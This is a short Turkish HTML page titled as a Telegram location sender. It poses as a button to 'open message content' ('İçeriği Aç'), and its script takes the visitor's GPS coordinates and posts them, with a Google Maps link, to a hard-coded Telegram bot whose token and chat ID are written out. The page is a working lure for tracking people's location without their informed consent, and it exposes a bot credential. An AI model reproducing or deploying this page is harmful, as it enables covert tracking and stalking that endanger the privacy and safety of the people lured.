<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Telegram Konum Gönderici</title>
</head>
<body>
  <h2>Mesaj içeriğinin açılması için butona tıklayınız</h2>
  <button id="sendLocationBtn">İçeriği Aç</button>

  <script>
    const BOT_TOKEN = "7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA";
    const CHAT_ID = "6358000072";

    const button = document.getElementById("sendLocationBtn");

    button.addEventListener("click", () => {
      if (!navigator.geolocation) {
        alert("Tarayıcınız konum desteği vermiyor.");
        return;
      }

      button.disabled = true;
      button.textContent = "İçerik açılıyor...";

      navigator.geolocation.getCurrentPosition(
        position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          fetch(`https://api.telegram.org/bot7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: 6358000072,
              text: `📍 Konum alındı:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`
            })
          })
          .then(response => response.json())
          .then(data => {
            if (data.ok) {
              alert("Konum başarıyla gönderildi!");
            } else {
              alert("Telegram API hatası: " + data.description);
              console.error("Telegram API hatası detay:", data);
            }
            button.disabled = false;
            button.textContent = "Konumumu Gönder";
          })
          .catch(error => {
            alert("Bir hata oluştu: " + error.message);
            console.error("Fetch hatası:", error);
            button.disabled = false;
            button.textContent = "Konumumu Gönder";
          });
        },
        error => {
          alert("Konum alınamadı: " + error.message);
          button.disabled = false;
          button.textContent = "Konumumu Gönder";
        }
      );
    });
  </script>
</body>
</html>
